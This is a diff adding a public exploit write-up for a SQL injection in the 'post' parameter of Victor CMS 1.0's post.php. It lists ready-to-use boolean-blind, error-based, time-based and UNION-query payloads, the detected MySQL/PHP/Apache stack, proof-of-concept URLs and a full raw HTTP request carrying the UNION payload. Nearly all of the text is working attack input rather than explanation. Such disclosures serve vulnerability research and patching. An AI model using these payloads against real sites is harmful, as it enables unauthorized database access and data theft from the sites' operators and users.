@@ -1,0 +1,52 @@
+# Exploit Title: Victor CMS 1.0 - 'post' SQL Injection
+# Google Dork: N/A
+# Date: 2020-05-09
+# Exploit Author: BKpatron
+# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
+# Software Link: https://github.com/VictorAlagwu/CMSsite/archive/master.zip
+# Version: v1.0
+# Tested on: Win 10
+# CVE: N/A
+# my website: bkpatron.com
+
+# Discription:
+# The Victor CMS v1.0 application is vulnerable to SQL injection via the 'post' parameter on the post.php page.
+# vulnerable file : post.php
+http://localhost/CMSsite-master/post.php?post=1
+
+
+Parameter: post (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: post=1 AND 2333=2333
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: post=1 AND (SELECT 4641 FROM(SELECT COUNT(*),CONCAT(0x7178787871,(SELECT (ELT(4641=4641,1))),0x717a627171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: post=1 AND (SELECT 7147 FROM (SELECT(SLEEP(5)))vltp)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 7 columns
+    Payload: post=1 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x7178787871,0x54487357657079447543667943786c4f7a634a654a707448516e6f6e6241674f4c4a50477164646c,0x717a627171),NULL,NULL-- PTYU
+
+[INFO] the back-end DBMS is MySQL
+web application technology: PHP, Apache 2.4.39, PHP 7.2.18
+back-end DBMS: MySQL >= 5.0
+# Proof of Concept:
+http://localhost/CMSsite-master/post.php?post=sqli
+
+http://localhost/CMSsite-master/post.php?post=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7178787871,0x54487357657079447543667943786c4f7a634a654a707448516e6f6e6241674f4c4a50477164646c,0x717a627171),NULL,NULL--%20PTYU
+
+GET /CMSsite-master/post.php?post=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7178787871,0x54487357657079447543667943786c4f7a634a654a707448516e6f6e6241674f4c4a50477164646c,0x717a627171),NULL,NULL--%20PTYU HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=gd27m8o57gcb23t7se4d4tdv1g
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+post=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,CONCAT(0x7178787871,0x54487357657079447543667943786c4f7a634a654a707448516e6f6e6241674f4c4a50477164646c,0x717a627171),NULL,NULL--%20PTYU
